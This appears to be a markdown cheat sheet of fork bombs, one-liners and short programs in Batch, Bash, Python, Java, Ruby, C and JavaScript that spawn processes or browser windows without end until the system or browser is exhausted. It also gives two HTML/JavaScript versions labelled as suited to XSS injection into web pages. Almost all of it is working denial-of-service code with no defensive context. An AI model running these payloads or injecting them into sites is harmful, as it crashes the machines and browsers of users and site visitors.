### Bat
```
%0 | %0
```

Quick and dirty forkbomb for all flavors of windows Do not use in production. Replace start with a command of your choice, this will just open a new command prompt and is pretty tricky to stop once started
```
for /l %a in (0,0,0) do start
```
### Bash
```
:(){ :|:& };:
```

### Python
```
 import os
 while 1:
     os.fork()
```

### Java
```
public class ForkBomb
{
  public static void main(String[] args)
  {
    while(true)
    {
      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
    }
  }
}
```

### Ruby
```
loop { fork { load(__FILE__) } }
```

### C
```
#include <unistd.h>

int main(void)
{
    while(1) {
      fork(); /* malloc can be used in order to increase the data usage */
    }
}
```

### JavaScript
```
while (true) {
  var w = window.open();
  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
}
```

The following version is easier for injection (XSS):
```
<a href="#" onload="function() { while (true) { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); } }">XSS fork bomb</a>
```
And the following is simply a more aggressive version of the above:
```
<script>
setInterval(function() {
  var w = window.open();
  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
}, 10);
</script>
```
